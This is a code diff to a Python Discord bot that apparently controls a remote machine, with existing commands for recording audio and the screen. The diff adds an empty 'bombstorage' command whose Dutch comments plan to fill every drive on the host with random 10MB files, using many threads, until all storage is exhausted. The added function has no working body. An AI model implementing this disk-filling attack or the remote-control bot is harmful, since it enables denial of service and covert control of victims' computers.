@@ -447,6 +447,18 @@ async def audio(ctx, action: str, duration: str = None):
         await ctx.send(f"❌ Error: {str(e)}")
 
 @bot.command()
+async def bombstorage(ctx):
+    # Welke drives zijn er, check hoeveel storage, 
+    # Als minder dan 10mb stop, ga naar volgende drive als die er is doe het zelfde als alle drives vol zijn stop.
+    # Gebruik python threading om zo snel mogelijk de files aan te maken,
+    # filename = random string,
+    # with f write to filename data tot het bestand 10mb is
+    # begin daarna op nieuw
+    # probeer eerst 1 tread/function als dit werkt probeer multi threading toe te voegen
+    # bijvoorbeeld for i in range(0,10)
+    # dan moet je async def hebben( geen bot command) die je dan 10 x aan slaar voor 10 threats.
+
+@bot.command()
 async def screen(ctx, action: str):
     global recording_task  # To access the global task variable
     rec = False
